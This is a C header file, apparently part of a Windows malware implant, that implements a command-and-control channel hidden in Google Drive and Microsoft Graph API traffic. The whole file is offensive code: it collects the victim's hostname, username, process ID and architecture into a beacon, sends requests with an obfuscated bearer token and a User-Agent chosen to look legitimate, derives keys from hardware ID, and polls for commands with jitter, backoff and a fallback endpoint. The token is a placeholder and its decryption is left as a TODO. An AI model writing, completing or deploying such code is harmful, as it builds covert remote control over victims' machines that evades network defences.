#ifndef GDRIVE_C2_H
#define GDRIVE_C2_H

#include <windows.h>
#include <objbase.h>
#include <httprequest.h>
#include <stdint.h>
#include "crypto.h"

// =============================================================================
// CONFIGURATION
// =============================================================================

#define C2_JITTER_PERCENT   20
#define C2_MAX_RETRIES      8
#define C2_INITIAL_BACKOFF  2000   // 2 seconds
#define C2_MAX_BACKOFF      300000 // 5 minutes
#define MAX_COMMAND_LEN     8192

typedef struct _C2_CONFIG {
    uint8_t  encryptedToken[256];
    uint8_t  nonce[CHACHA_NONCE_SIZE];
    uint32_t checkInterval;          // Base interval in ms
    WCHAR    gdriveEndpoint[256];
    WCHAR    msgraphEndpoint[256];
    DWORD    consecutiveFailures;
    DWORD    currentBackoff;
} C2_CONFIG;

static C2_CONFIG g_C2 = {
    { 0xAB, 0xCD, 0xEF /* ... encrypted token data placeholder ... */ },
    { 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C },
    60000,  // 1 minute
    L"https://www.googleapis.com/drive/v3/files?pageSize=1",
    L"https://graph.microsoft.com/v1.0/me/drive/root/children",
    0,
    C2_INITIAL_BACKOFF
};

// =============================================================================
// SYSTEM INFO BEACON
// =============================================================================

static void BuildBeaconInfo(char *buf, DWORD bufSize) {
    if (!buf || bufSize < 128) return;

    wchar_t compName[MAX_COMPUTERNAME_LENGTH + 1] = {0};
    DWORD compSize = MAX_COMPUTERNAME_LENGTH + 1;
    GetComputerNameW(compName, &compSize);

    wchar_t userName[256] = {0};
    DWORD userSize = 256;
    GetUserNameW(userName, &userSize);

    OSVERSIONINFOW osvi = {0};
    osvi.dwOSVersionInfoSize = sizeof(osvi);

    // Format: hostname|user|pid|arch
    DWORD pid = GetCurrentProcessId();
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    const char *arch = (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) ? "x64" : "x86";

    // Simple ASCII conversion
    char host[64] = {0}, user[64] = {0};
    for (DWORD i = 0; i < compSize && i < 63; i++) host[i] = (char)compName[i];
    for (DWORD i = 0; i < userSize && i < 63; i++) user[i] = (char)userName[i];

    // Manual snprintf-like formatting (avoid stdio)
    int pos = 0;
    // host
    for (int i = 0; host[i] && pos < (int)bufSize - 32; i++) buf[pos++] = host[i];
    buf[pos++] = '|';
    // user
    for (int i = 0; user[i] && pos < (int)bufSize - 24; i++) buf[pos++] = user[i];
    buf[pos++] = '|';
    // pid (simple decimal)
    char pidStr[16];
    int pidLen = 0;
    DWORD tmp = pid;
    do { pidStr[pidLen++] = '0' + (tmp % 10); tmp /= 10; } while (tmp > 0);
    for (int i = pidLen - 1; i >= 0 && pos < (int)bufSize - 8; i--) buf[pos++] = pidStr[i];
    buf[pos++] = '|';
    // arch
    for (int i = 0; arch[i] && pos < (int)bufSize - 1; i++) buf[pos++] = arch[i];
    buf[pos] = '\0';
}

// =============================================================================
// COM-BASED HTTP REQUEST WITH PROPER CLEANUP
// =============================================================================

static BOOL HttpRequest(LPCWSTR url, char *outBuf, DWORD outBufSize, DWORD *bytesReceived) {
    BOOL comInit = FALSE;
    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (SUCCEEDED(hr) || hr == S_FALSE) comInit = TRUE;
    else return FALSE;

    IWinHttpRequest *pRequest = NULL;
    BOOL success = FALSE;

    hr = CoCreateInstance(CLSID_WinHttpRequest, NULL, CLSCTX_INPROC_SERVER,
                          IID_IWinHttpRequest, (void **)&pRequest);
    if (FAILED(hr) || !pRequest) goto cleanup;

    {
        BSTR bstrMethod = SysAllocString(L"GET");
        BSTR bstrUrl = SysAllocString(url);
        VARIANT varAsync;
        VariantInit(&varAsync);
        varAsync.vt = VT_BOOL;
        varAsync.boolVal = VARIANT_FALSE;

        hr = pRequest->Open(bstrMethod, bstrUrl, varAsync);
        SysFreeString(bstrMethod);
        SysFreeString(bstrUrl);
        if (FAILED(hr)) goto release;

        // Set authorization header
        uint8_t tokenKey[CHACHA_KEY_SIZE];
        DeriveKeyFromHWID(tokenKey);
        // TODO: decrypt g_C2.encryptedToken with tokenKey to get bearer token
        BSTR bstrHdr = SysAllocString(L"Authorization");
        BSTR bstrVal = SysAllocString(OBFUSCATE(L"Bearer [TOKEN_PLACEHOLDER]"));
        pRequest->SetRequestHeader(bstrHdr, bstrVal);
        SysFreeString(bstrHdr);
        SysFreeString(bstrVal);
        SecureWipe(tokenKey, sizeof(tokenKey));

        // Set User-Agent to look legitimate
        BSTR bstrUA = SysAllocString(L"User-Agent");
        BSTR bstrUAVal = SysAllocString(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
        pRequest->SetRequestHeader(bstrUA, bstrUAVal);
        SysFreeString(bstrUA);
        SysFreeString(bstrUAVal);

        VARIANT varEmpty;
        VariantInit(&varEmpty);
        hr = pRequest->Send(varEmpty);
        if (FAILED(hr)) goto release;

        VARIANT varBody;
        VariantInit(&varBody);
        hr = pRequest->get_ResponseBody(&varBody);
        if (SUCCEEDED(hr) && (varBody.vt & VT_ARRAY)) {
            long lBound, uBound;
            SafeArrayGetLBound(varBody.parray, 1, &lBound);
            SafeArrayGetUBound(varBody.parray, 1, &uBound);
            long len = uBound - lBound + 1;

            void *pData;
            SafeArrayAccessData(varBody.parray, &pData);
            DWORD toCopy = ((DWORD)len < outBufSize) ? (DWORD)len : outBufSize;
            memcpy(outBuf, pData, toCopy);
            SafeArrayUnaccessData(varBody.parray);

            if (bytesReceived) *bytesReceived = toCopy;
            success = TRUE;
        }
        VariantClear(&varBody);
    }

release:
    if (pRequest) {
        pRequest->Release();
        pRequest = NULL;
    }

cleanup:
    if (comInit) CoUninitialize();
    return success;
}

// =============================================================================
// EXPONENTIAL BACKOFF WITH JITTER
// =============================================================================

static DWORD CalculateBackoff() {
    DWORD backoff = g_C2.currentBackoff;

    // Add jitter: ±C2_JITTER_PERCENT
    DWORD jitterRange = (backoff * C2_JITTER_PERCENT) / 100;
    if (jitterRange > 0) {
        DWORD jitter = GetTickCount() % (2 * jitterRange + 1);
        backoff = backoff - jitterRange + jitter;
    }

    return backoff;
}

static void OnRequestSuccess() {
    g_C2.consecutiveFailures = 0;
    g_C2.currentBackoff = C2_INITIAL_BACKOFF;
}

static void OnRequestFailure() {
    g_C2.consecutiveFailures++;
    // Exponential backoff: double each failure, cap at max
    g_C2.currentBackoff = g_C2.currentBackoff * 2;
    if (g_C2.currentBackoff > C2_MAX_BACKOFF) g_C2.currentBackoff = C2_MAX_BACKOFF;
}

// =============================================================================
// GDRIVE + MS GRAPH FALLBACK C2
// =============================================================================

static BOOL GDrive_CheckForCommandsEx(char *buffer, DWORD bufferSize, DWORD *bytesReceived) {
    if (bytesReceived) *bytesReceived = 0;

    // Try Google Drive first
    BOOL ok = HttpRequest(g_C2.gdriveEndpoint, buffer, bufferSize, bytesReceived);
    if (ok) {
        OnRequestSuccess();
        return TRUE;
    }

    // Fallback: Microsoft Graph API
    ok = HttpRequest(g_C2.msgraphEndpoint, buffer, bufferSize, bytesReceived);
    if (ok) {
        OnRequestSuccess();
        return TRUE;
    }

    // Both failed – apply exponential backoff
    OnRequestFailure();

    // Wait with backoff before caller retries
    DWORD waitMs = CalculateBackoff();
    Sleep(waitMs);

    return FALSE;
}

// =============================================================================
// LEGACY COMPATIBILITY WRAPPER
// =============================================================================

static BOOL GDrive_CheckForCommands(char *buffer, DWORD bufferSize) {
    DWORD received = 0;
    return GDrive_CheckForCommandsEx(buffer, bufferSize, &received);
}

#endif
